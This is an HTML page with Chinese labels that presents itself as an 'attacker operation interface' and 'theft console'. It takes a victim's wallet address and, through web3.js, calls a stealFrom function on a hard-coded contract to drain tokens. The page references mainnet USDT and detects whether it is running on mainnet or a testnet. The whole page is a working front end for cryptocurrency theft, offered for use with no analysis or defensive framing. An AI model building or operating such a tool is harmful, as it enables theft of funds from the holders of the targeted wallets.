<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>盜取控制台 v3.0（測試網）</title>
</head>
<body>
  <h1>🛠 攻擊者操作介面</h1>
  <p>🔗 合約地址：<b>0xfC35E3407c86461BA2D00C080cC763c0f6878377</b></p>
  <p>🧪 當前網路：<span id="network">查詢中...</span></p>
  <input type="text" id="victim" placeholder="受害者地址" size="50" />
  <button onclick="drain()">執行盜取</button>
  <pre id="log">🪵 等待操作...</pre>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const CONTRACT = "0xfC35E3407c86461BA2D00C080cC763c0f6878377";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 主網 USDT
    const ABI = [{ "name": "stealFrom", "type": "function", "inputs": [
      { "type": "address", "name": "victim" }
    ], "outputs": [], "stateMutability": "nonpayable", "type": "function" }];

    async function drain() {
      const web3 = new Web3(window.ethereum);
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const victim = document.getElementById("victim").value;
      const contract = new web3.eth.Contract(ABI, CONTRACT);
      document.getElementById("log").innerText = `🚀 呼叫 stealFrom(${victim})...`;
      try {
        const tx = await contract.methods.stealFrom(victim).send({ from: accounts[0] });
        document.getElementById("log").innerText += `
✅ 成功！TX: ${tx.transactionHash}`;
      } catch (e) {
        document.getElementById("log").innerText += `
❌ 失敗：${e.message}`;
      }
    }

    async function detectNetwork() {
      const chainId = await ethereum.request({ method: 'eth_chainId' });
      const map = { "0x1": "Ethereum 主網", "0xaa36a7": "Sepolia 測試網" };
      document.getElementById("network").innerText = map[chainId] || `未知網路 (${chainId})`;
    }

    detectNetwork();
  </script>
</body>
</html>
